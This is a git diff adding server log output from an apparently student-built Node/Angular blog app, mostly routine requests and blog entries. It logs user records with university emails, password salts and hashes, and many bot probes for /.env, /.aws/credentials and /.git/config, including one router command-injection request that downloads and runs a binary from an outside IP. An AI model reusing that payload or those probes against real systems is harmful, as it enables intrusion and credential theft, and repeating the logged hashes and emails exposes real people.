@@ -869,3 +869,821 @@ Blog id 66082474a81badbb4c769b9f deleted
 ]
 [0mGET /api/blogs [32m200 [0m5.030 ms - 113[0m
 [0mGET /favicon.ico [36m304 [0m0.689 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m3.064 ms - 113[0m
+[0mGET /favicon.ico [36m304 [0m0.687 ms - -[0m
+[0mGET / [36m304 [0m0.492 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m3.290 ms - -[0m
+[0mGET /lib/angular.min.js [36m304 [0m3.259 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m0.864 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m2.737 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m2.598 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m1.403 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m1.507 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m2.107 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.473 ms - -[0m
+[0mGET /nav/navigation.html [32m200 [0m1.486 ms - 954[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m3.422 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.991 ms - -[0m
+[0mGET / [36m304 [0m0.520 ms - -[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.967 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m1.009 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.441 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m3.144 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m3.052 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m3.491 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m0.371 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m0.474 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.568 ms - -[0m
+[0mGET /nav/navigation.html [32m200 [0m0.717 ms - 954[0m
+[0mGET /favicon.ico [36m304 [0m0.625 ms - -[0m
+[0mGET /auth/login.view.html [36m304 [0m0.508 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.574 ms - -[0m
+Login request received: trogers@millersville.edu
+Passport authentication result: null {
+  _id: new ObjectId('6606e0c9ecbe4284a4dcdeb6'),
+  name: 'Thomas J Rogers',
+  email: 'trogers@millersville.edu',
+  salt: 'b734b0c908d040139dcdb829c03bda8a',
+  hash: 'og1gFKf7xaxR4nGwkhsiVQ8XTDDHiezHOOn/GPSts/cx0IGgqt7K2oraFhElFP3eygiCYgMCpzjcaVeq/84T5Q==',
+  __v: 0
+} undefined
+[0mPOST /api/login [32m200 [0m12.411 ms - 264[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m4.221 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.826 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.640 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.655 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.712 ms - -[0m
+{ title: 'Prof test 2', text: 'Great job!' }
+{
+  title: 'Prof test 2',
+  text: 'Great job!',
+  createdOn: 2024-03-30T15:05:59.278Z,
+  _id: new ObjectId('66082a57a81badbb4c769bab'),
+  __v: 0
+}
+[0mPOST /api/blogs/ [32m201 [0m3.471 ms - 123[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m3.073 ms - 229[0m
+[0mGET /favicon.ico [36m304 [0m0.846 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.618 ms - -[0m
+[0mGET / [36m304 [0m0.463 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.786 ms - -[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.845 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.973 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m3.642 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m4.556 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m1.563 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m17.598 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m3.745 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.462 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.495 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.672 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m1.500 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m3.144 ms - 229[0m
+[0mGET /.env [32m200 [0m1.061 ms - 4749[0m
+[0mPOST / [32m200 [0m1.611 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.848 ms - 4749[0m
+[0mPOST / [32m200 [0m1.347 ms - 4749[0m
+[0mGET / [32m200 [0m0.811 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.126 ms - 4749[0m
+[0mPOST / [32m200 [0m0.928 ms - 4749[0m
+[0mGET /node/kor/113/main [32m200 [0m0.895 ms - 4749[0m
+[0mGET /node/kor/113/main [32m200 [0m0.907 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.918 ms - 4749[0m
+[0mGET /node/kor/113/main [32m200 [0m0.952 ms - 4749[0m
+[0mGET /node/kor/113/main [32m200 [0m0.957 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.799 ms - 4749[0m
+[0mPOST / [32m200 [0m2.318 ms - 4749[0m
+[0mGET / [32m200 [0m1.418 ms - 4749[0m
+[0mGET / [32m200 [0m0.704 ms - 4749[0m
+[0mPOST /boaform/admin/formLogin [32m200 [0m1.269 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.083 ms - 4749[0m
+[0mPOST / [32m200 [0m1.364 ms - 4749[0m
+[0mGET /cdn-cgi/trace [32m200 [0m1.290 ms - 4749[0m
+[0mGET / [32m200 [0m0.723 ms - 4749[0m
+[0mGET /cdn-cgi/trace [32m200 [0m0.928 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.811 ms - 4749[0m
+[0mPOST / [32m200 [0m0.855 ms - 4749[0m
+[0mGET / [32m200 [0m0.819 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.753 ms - 4749[0m
+[0mPOST / [32m200 [0m1.518 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.798 ms - 4749[0m
+[0mPOST / [32m200 [0m0.844 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.795 ms - 4749[0m
+[0mPOST / [32m200 [0m0.774 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.773 ms - 4749[0m
+[0mPOST / [32m200 [0m1.162 ms - 4749[0m
+[0mGET / [32m200 [0m0.832 ms - 4749[0m
+[0mGET /region [32m200 [0m0.752 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.782 ms - 4749[0m
+[0mPOST / [32m200 [0m0.933 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.868 ms - 4749[0m
+[0mPOST / [32m200 [0m0.851 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.832 ms - 4749[0m
+[0mPOST / [32m200 [0m1.078 ms - 4749[0m
+[0mHEAD /.env [32m200 [0m0.645 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.424 ms - 4749[0m
+[0mGET / [32m200 [0m0.631 ms - 4749[0m
+[0mGET /manager/text/list [32m200 [0m1.105 ms - 4749[0m
+[0mGET / [32m200 [0m0.774 ms - 4749[0m
+[0mGET /portal/redlion [32m200 [0m1.024 ms - 4749[0m
+[0mGET / [32m200 [0m0.805 ms - 4749[0m
+[0mGET /cloud-api/plp-food-papi/v1/custom/autoffers/cat20018 [32m200 [0m0.828 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.945 ms - 4749[0m
+[0mPOST / [32m200 [0m230.157 ms - 4749[0m
+[0mGET /robots.txt [32m200 [0m0.864 ms - 4749[0m
+[0mGET /sitemap_index.xml [32m200 [0m0.873 ms - 4749[0m
+[0mGET /sitemap_index.xml [32m200 [0m0.921 ms - 4749[0m
+[0mGET /druid/index.html [32m200 [0m0.970 ms - 4749[0m
+[0mGET / [32m200 [0m0.904 ms - 4749[0m
+[0mGET / [32m200 [0m1.274 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.160 ms - 4749[0m
+[0mPOST / [32m200 [0m0.827 ms - 4749[0m
+[0mGET / [32m200 [0m0.757 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.896 ms - 4749[0m
+[0mPOST / [32m200 [0m0.941 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.942 ms - 4749[0m
+[0mPOST / [32m200 [0m1.171 ms - 4749[0m
+[0mGET / [32m200 [0m0.704 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.887 ms - 4749[0m
+[0mPOST / [32m200 [0m0.972 ms - 4749[0m
+[0mGET / [32m200 [0m2.151 ms - 4749[0m
+[0mGET / [32m200 [0m0.691 ms - 4749[0m
+[0mGET / [32m200 [0m0.667 ms - 4749[0m
+[0mGET / [32m200 [0m2.661 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.858 ms - 4749[0m
+[0mPOST / [32m200 [0m0.964 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.343 ms - 4749[0m
+[0mPOST / [32m200 [0m0.834 ms - 4749[0m
+[0mGET / [32m200 [0m0.660 ms - 4749[0m
+[0mGET / [32m200 [0m1.205 ms - 4749[0m
+[0mGET / [32m200 [0m0.770 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.943 ms - 4749[0m
+[0mPOST / [32m200 [0m1.099 ms - 4749[0m
+[0mGET / [32m200 [0m0.988 ms - 4749[0m
+[0mGET /hudson [32m200 [0m0.861 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.268 ms - 4749[0m
+[0mPOST / [32m200 [0m0.787 ms - 4749[0m
+[0mGET / [32m200 [0m0.710 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.832 ms - 4749[0m
+[0mPOST / [32m200 [0m1.376 ms - 4749[0m
+[0mGET / [32m200 [0m0.866 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.790 ms - 4749[0m
+[0mPOST / [32m200 [0m24.601 ms - 4749[0m
+[0mGET / [32m200 [0m0.870 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.855 ms - 4749[0m
+[0mPOST / [32m200 [0m0.819 ms - 4749[0m
+[0mGET / [32m200 [0m0.828 ms - 4749[0m
+[0mGET / [32m200 [0m0.754 ms - 4749[0m
+[0mGET /.aws/credentials [32m200 [0m1.336 ms - 4749[0m
+[0mGET /phpinfo [32m200 [0m1.017 ms - 4749[0m
+[0mGET /phpinfo.php [32m200 [0m1.124 ms - 4749[0m
+[0mGET /.env.bak [32m200 [0m0.900 ms - 4749[0m
+[0mGET /info.php [32m200 [0m0.803 ms - 4749[0m
+[0mGET /config/aws.yml [32m200 [0m1.009 ms - 4749[0m
+[0mGET /_profiler/phpinfo [32m200 [0m0.876 ms - 4749[0m
+[0mGET /.aws/ [32m200 [0m1.474 ms - 4749[0m
+[0mGET /.aws/config [32m200 [0m0.863 ms - 4749[0m
+[0mGET /.config [32m200 [0m1.593 ms - 4749[0m
+[0mGET / [32m200 [0m0.716 ms - 4749[0m
+[0mPOST /boaform/admin/formLogin [32m200 [0m0.823 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.810 ms - 4749[0m
+[0mPOST / [32m200 [0m0.794 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.077 ms - 4749[0m
+[0mGET /sitemap.xml.gz [32m200 [0m1.010 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.741 ms - 4749[0m
+[0mGET / [32m200 [0m0.722 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m0.814 ms - 4749[0m
+[0mGET /geoserver/web/ [32m200 [0m0.865 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.779 ms - 4749[0m
+[0mPOST / [32m200 [0m0.788 ms - 4749[0m
+[0mGET / [32m200 [0m1.382 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.861 ms - 4749[0m
+[0mPOST / [32m200 [0m0.831 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.763 ms - 4749[0m
+[0mPOST / [32m200 [0m0.817 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.893 ms - 4749[0m
+[0mPOST / [32m200 [0m1.035 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.777 ms - 4749[0m
+[0mPOST / [32m200 [0m2.765 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.833 ms - 4749[0m
+[0mPOST / [32m200 [0m1.968 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.778 ms - 4749[0m
+[0mPOST / [32m200 [0m0.720 ms - 4749[0m
+[0mGET / [32m200 [0m0.726 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.889 ms - 4749[0m
+[0mPOST / [32m200 [0m1.009 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.793 ms - 4749[0m
+[0mPOST / [32m200 [0m0.846 ms - 4749[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.767 ms - 4749[0m
+[0mGET / [32m200 [0m0.772 ms - 4749[0m
+[0mGET / [32m200 [0m0.709 ms - 4749[0m
+[0mGET /auth/authentication.js [32m200 [0m2.063 ms - 4037[0m
+[0mGET /nav/navigation.js [32m200 [0m1.279 ms - 712[0m
+[0mGET /stylesheets/style.css [32m200 [0m2.924 ms - 111[0m
+[0mGET /bootstrap/css/bootstrap.min.css [32m200 [0m3.526 ms - 4749[0m
+[0mGET /lib/angular-route.min.js [32m200 [0m3.193 ms - 5720[0m
+[0mGET /css/all.min.css [32m200 [0m7.612 ms - 4749[0m
+[0mGET /js/bloggerApp.js [32m200 [0m1.262 ms - 5392[0m
+[0mGET /lib/angular.min.js [32m200 [0m3.686 ms - 177368[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m2.248 ms - 232948[0m
+[0mGET /nav/navigation.html [32m200 [0m1.317 ms - 954[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m12.456 ms - 229[0m
+[0mGET /favicon.ico [32m200 [0m0.716 ms - 4749[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m3.161 ms - -[0m
+[0mGET / [32m200 [0m0.856 ms - 4749[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.496 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m0.559 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.507 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m1.229 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m3.224 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m1.045 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m1.745 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m1.935 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.481 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m1.966 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m12.102 ms - -[0m
+[0mGET /.env [32m200 [0m0.750 ms - 4749[0m
+[0mPOST / [32m200 [0m0.804 ms - 4749[0m
+[0mGET /sitemap_index.xml [32m200 [0m0.921 ms - 4749[0m
+[0mGET /sitemap_index.xml [32m200 [0m0.851 ms - 4749[0m
+[0mGET /actuator/gateway/routes [32m200 [0m0.855 ms - 4749[0m
+[0mGET / [32m200 [0m0.708 ms - 4749[0m
+[0mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F185.224.128.34%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) [32m200 [0m0.837 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.793 ms - 4749[0m
+[0mPOST / [32m200 [0m2.566 ms - 4749[0m
+[0mGET / [32m200 [0m0.682 ms - 4749[0m
+[0mGET / [32m200 [0m0.738 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.770 ms - 4749[0m
+[0mPOST / [32m200 [0m0.979 ms - 4749[0m
+[0mGET / [32m200 [0m0.661 ms - 4749[0m
+[0mGET /nav/navigation.html [36m304 [0m0.443 ms - -[0m
+[0mGET / [32m200 [0m0.637 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.762 ms - 4749[0m
+[0mPOST / [32m200 [0m0.924 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.170 ms - 4749[0m
+[0mPOST / [32m200 [0m0.846 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.884 ms - 4749[0m
+[0mPOST / [32m200 [0m0.892 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.733 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.847 ms - 4749[0m
+[0mPOST / [32m200 [0m0.816 ms - 4749[0m
+[0mGET / [32m200 [0m0.801 ms - 4749[0m
+[0mGET /form.html [32m200 [0m0.827 ms - 4749[0m
+[0mGET /upl.php [32m200 [0m0.851 ms - 4749[0m
+[0mGET /geoip/ [32m200 [0m0.863 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m1.318 ms - 4749[0m
+[0mGET /1.php [32m200 [0m0.927 ms - 4749[0m
+[0mGET /bundle.js [32m200 [0m0.799 ms - 4749[0m
+[0mGET /files/ [32m200 [0m2.791 ms - 4749[0m
+[0mGET /systembc/password.php [32m200 [0m0.998 ms - 4749[0m
+[0mGET /password.php [32m200 [0m0.889 ms - 4749[0m
+[0mGET /info.php [32m200 [0m1.513 ms - 4749[0m
+[0mGET / [32m200 [0m0.710 ms - 4749[0m
+[0mGET / [32m200 [0m0.688 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.798 ms - 4749[0m
+[0mPOST / [32m200 [0m1.001 ms - 4749[0m
+[0mGET / [32m200 [0m0.684 ms - 4749[0m
+[0mGET / [32m200 [0m0.813 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.788 ms - 4749[0m
+[0mPOST / [32m200 [0m0.730 ms - 4749[0m
+[0mGET /nav/navigation.html [36m304 [0m0.441 ms - -[0m
+[0mGET / [32m200 [0m0.789 ms - 4749[0m
+[0mGET / [32m200 [0m0.781 ms - 4749[0m
+[0mGET /.git/config [32m200 [0m1.297 ms - 4749[0m
+[0mGET / [32m200 [0m0.986 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.821 ms - 4749[0m
+[0mPOST / [32m200 [0m0.771 ms - 4749[0m
+[0mGET /aaa9 [32m200 [0m1.082 ms - 4749[0m
+[0mGET /aab8 [32m200 [0m0.962 ms - 4749[0m
+[0mGET / [32m200 [0m1.143 ms - 4749[0m
+[0mPOST /boaform/admin/formLogin [32m200 [0m0.845 ms - 4749[0m
+[0mGET / [32m200 [0m0.782 ms - 4749[0m
+[0mGET / [32m200 [0m1.656 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.816 ms - 4749[0m
+[0mPOST / [32m200 [0m0.933 ms - 4749[0m
+[0mGET / [32m200 [0m0.654 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.849 ms - 4749[0m
+[0mPOST / [32m200 [0m0.784 ms - 4749[0m
+[0mGET http://httpbin.org/ip [32m200 [0m1.829 ms - 4749[0m
+[0mGET / [32m200 [0m0.813 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.758 ms - 4749[0m
+[0mPOST / [32m200 [0m0.858 ms - 4749[0m
+[0mGET / [32m200 [0m0.815 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m0.845 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.916 ms - 4749[0m
+[0mPOST / [32m200 [0m1141.777 ms - 4749[0m
+[0mGET / [32m200 [0m0.825 ms - 4749[0m
+[0mGET / [32m200 [0m0.780 ms - 4749[0m
+[0mGET / [32m200 [0m0.697 ms - 4749[0m
+[0mGET / [32m200 [0m0.871 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.800 ms - 4749[0m
+[0mPOST / [32m200 [0m0.768 ms - 4749[0m
+[0mGET / [32m200 [0m0.750 ms - 4749[0m
+[0mGET / [32m200 [0m0.709 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.941 ms - 4749[0m
+[0mPOST /.env [32m200 [0m0.807 ms - 4749[0m
+[0mGET /.aws/credentials [32m200 [0m0.803 ms - 4749[0m
+[0mPOST /.aws/credentials [32m200 [0m31.868 ms - 4749[0m
+[0mGET /.aws/config [32m200 [0m0.880 ms - 4749[0m
+[0mPOST /.aws/config [32m200 [0m28.184 ms - 4749[0m
+[0mGET /aws.yml [32m200 [0m0.863 ms - 4749[0m
+[0mPOST /aws.yml [32m200 [0m6.395 ms - 4749[0m
+[0mGET /config/aws.yml [32m200 [0m0.858 ms - 4749[0m
+[0mPOST /config/aws.yml [32m200 [0m0.874 ms - 4749[0m
+[0mGET /.json [32m200 [0m0.827 ms - 4749[0m
+[0mPOST /.json [32m200 [0m32.906 ms - 4749[0m
+[0mGET /.config [32m200 [0m0.855 ms - 4749[0m
+[0mPOST /.config [32m200 [0m1.125 ms - 4749[0m
+[0mGET /config.yaml [32m200 [0m0.896 ms - 4749[0m
+[0mPOST /config.yaml [32m200 [0m1.709 ms - 4749[0m
+[0mGET /config.json [32m200 [0m0.802 ms - 4749[0m
+[0mPOST /config.json [32m200 [0m19.627 ms - 4749[0m
+[0mOPTIONS / [32m200 [0m0.813 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.754 ms - 4749[0m
+[0mPOST / [32m200 [0m439.903 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.862 ms - 4749[0m
+[0mPOST / [32m200 [0m0.930 ms - 4749[0m
+[0mGET /node/kor/113/main [32m200 [0m0.899 ms - 4749[0m
+[0mGET /node/kor/113/main [32m200 [0m1.245 ms - 4749[0m
+[0mGET /node/kor/113/main [32m200 [0m0.994 ms - 4749[0m
+[0mGET /node/kor/113/main [32m200 [0m0.884 ms - 4749[0m
+[0mGET / [32m200 [0m1.301 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.782 ms - 4749[0m
+[0mPOST / [32m200 [0m0.782 ms - 4749[0m
+[0mGET / [32m200 [0m0.785 ms - 4749[0m
+[0mGET /robots.txt [32m200 [0m0.998 ms - 4749[0m
+[0mGET /sitemap.xml [32m200 [0m1.197 ms - 4749[0m
+[0mGET /.well-known/security.txt [32m200 [0m1.486 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m0.938 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.815 ms - 4749[0m
+[0mPOST / [32m200 [0m1.193 ms - 4749[0m
+[0mGET / [32m200 [0m0.693 ms - 4749[0m
+[0mGET / [32m200 [0m0.853 ms - 4749[0m
+[0mGET / [32m200 [0m0.863 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m0.824 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.828 ms - 4749[0m
+[0mPOST / [32m200 [0m34.203 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.940 ms - 4749[0m
+[0mPOST / [32m200 [0m0.794 ms - 4749[0m
+[0mGET / [32m200 [0m0.647 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.753 ms - 4749[0m
+[0mPOST / [32m200 [0m0.829 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.882 ms - 4749[0m
+[0mPOST / [32m200 [0m0.903 ms - 4749[0m
+[0mGET / [32m200 [0m2.569 ms - 4749[0m
+[0mGET / [32m200 [0m0.691 ms - 4749[0m
+[0mGET /.env [32m200 [0m2.115 ms - 4749[0m
+[0mPOST / [32m200 [0m0.970 ms - 4749[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m0.845 ms - 232948[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.490 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.643 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m1.607 ms - -[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.535 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.730 ms - -[0m
+[0mGET /js/bloggerApp.js [32m200 [0m2.196 ms - 5392[0m
+[0mGET /auth/authentication.js [32m200 [0m0.622 ms - 4037[0m
+[0mGET /nav/navigation.js [32m200 [0m0.753 ms - 712[0m
+[0mGET /nav/navigation.html [32m200 [0m0.999 ms - 954[0m
+[0mGET /favicon.ico [36m304 [0m0.636 ms - -[0m
+[0mGET /auth/login.view.html [32m200 [0m2.521 ms - 984[0m
+[0mGET /favicon.ico [36m304 [0m0.538 ms - -[0m
+Login request received: inrapant@millersville.edu
+Passport authentication result: null {
+  _id: new ObjectId('65fb0e8709f3f542cfd2c539'),
+  name: 'Ilynd Rapant',
+  email: 'inrapant@millersville.edu',
+  salt: '8a585db66d3a9fc1ca4ef5fe9f96c99e',
+  hash: 'h1pvILT3xit+n4fEBP0v4SVKdEkkbZCreKdjQ5aWK3ibzuXgTQi6hjCF1TbgJKFxtGa+daG3YPELSAc97ZVWFA==',
+  __v: 0
+} undefined
+[0mPOST /api/login [32m200 [0m23.297 ms - 261[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m2.769 ms - 229[0m
+[0mGET /favicon.ico [36m304 [0m4.603 ms - -[0m
+[0mGET /.env [32m200 [0m0.768 ms - 4749[0m
+[0mPOST / [32m200 [0m0.990 ms - 4749[0m
+[0mGET / [36m304 [0m0.491 ms - -[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.972 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.944 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.498 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.657 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m1.252 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m1.026 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m2.241 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m1.439 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.872 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.579 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.331 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.702 ms - -[0m
+[0mGET / [32m200 [0m0.943 ms - 4749[0m
+[0mGET / [36m304 [0m0.481 ms - -[0m
